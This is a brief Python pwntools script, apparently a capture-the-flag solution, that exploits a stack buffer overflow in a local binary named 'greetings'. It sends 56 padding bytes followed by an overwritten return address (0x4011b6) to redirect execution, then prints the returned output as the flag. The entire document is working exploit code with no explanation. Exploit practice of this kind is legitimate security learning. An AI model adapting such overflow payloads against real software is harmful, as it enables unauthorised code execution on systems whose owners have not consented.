from pwn import *

io = process('./greetings')

# Data to be sent
payload = b"a" * 56
payload += p64(0x4011b6)
    # Send the data
io.sendline(payload)
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
# Receive and print the response
response = io.recv()
print("Flag:", response.decode())


io.close()